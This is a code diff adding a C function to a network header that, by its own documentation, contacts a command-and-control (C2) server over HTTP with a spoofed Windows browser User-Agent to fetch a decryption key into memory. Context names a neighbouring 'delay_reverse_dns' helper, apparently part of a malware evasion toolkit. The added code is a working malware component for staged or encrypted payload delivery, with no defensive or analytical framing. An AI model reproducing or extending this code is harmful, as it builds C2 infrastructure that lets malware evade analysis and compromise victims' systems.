@@ -257,4 +257,92 @@ static inline void delay_reverse_dns(const char* base_ip, unsigned int total_che
     }
 }
 
+/**
+ * Issues an HTTP GET request to a remote C2 server to dynamically fetch a decryption key into memory.
+ *
+ * @param host_or_ip C2 server hostname or IPv4 address.
+ * @param port Target TCP port (e.g., 80, 8080, 443).
+ * @param uri_path Key endpoint URI path (e.g., "/api/v1/get_key").
+ * @param out_key Pointer to output buffer where the retrieved key will be stored.
+ * @param max_key_len Maximum size of the destination key buffer.
+ * @param timeout_sec Maximum socket timeout in seconds.
+ * @return Number of bytes written to out_key on success, or -1 on network/HTTP failure.
+ */
+static inline int delay_c2_key_retrieval(const char* host_or_ip, int port, const char* uri_path, char* out_key, size_t max_key_len, unsigned int timeout_sec) {
+    if (!host_or_ip || !uri_path || !out_key || max_key_len == 0) return -1;
+
+    int s = socket(AF_INET, SOCK_STREAM, 0);
+    if (s < 0) return -1;
+
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons((uint16_t)port);
+
+    // Resolve IP or domain
+    if (inet_pton(AF_INET, host_or_ip, &addr.sin_addr) <= 0) {
+        struct hostent *server = gethostbyname(host_or_ip);
+        if (server == NULL) {
+            close(s);
+            return -1;
+        }
+        memcpy(&addr.sin_addr.s_addr, server->h_addr, server->h_length);
+    }
+
+    // Configure socket timeouts
+    struct timeval tv;
+    tv.tv_sec = (time_t)(timeout_sec > 0 ? timeout_sec : 10);
+    tv.tv_usec = 0;
+    setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
+    setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));
+
+    if (connect(s, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
+        close(s);
+        return -1;
+    }
+
+    // Formulate HTTP GET request
+    char req[512];
+    snprintf(req, sizeof(req), 
+             "GET %s HTTP/1.1\r\n"
+             "Host: %s\r\n"
+             "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
+             "Connection: close\r\n\r\n", 
+             uri_path, host_or_ip);
+
+    if (send(s, req, strlen(req), 0) < 0) {
+        close(s);
+        return -1;
+    }
+
+    // Read full HTTP response
+    char response[2048];
+    memset(response, 0, sizeof(response));
+    ssize_t bytes_received = recv(s, response, sizeof(response) - 1, 0);
+    close(s);
+
+    if (bytes_received <= 0) return -1;
+
+    // Separate HTTP header from payload body (\r\n\r\n)
+    char* body = strstr(response, "\r\n\r\n");
+    if (!body) return -1;
+    body += 4; // Advance pointer past CRLFCRLF
+
+    size_t key_len = strlen(body);
+    
+    // Strip potential trailing newline/carriage return from HTTP response body
+    while (key_len > 0 && (body[key_len - 1] == '\r' || body[key_len - 1] == '\n')) {
+        body[key_len - 1] = '\0';
+        key_len--;
+    }
+
+    if (key_len == 0 || key_len >= max_key_len) return -1;
+
+    // Copy key into provided memory buffer
+    memcpy(out_key, body, key_len);
+    out_key[key_len] = '\0';
+
+    return (int)key_len;
+}
+
 #endif // NETWORK_H
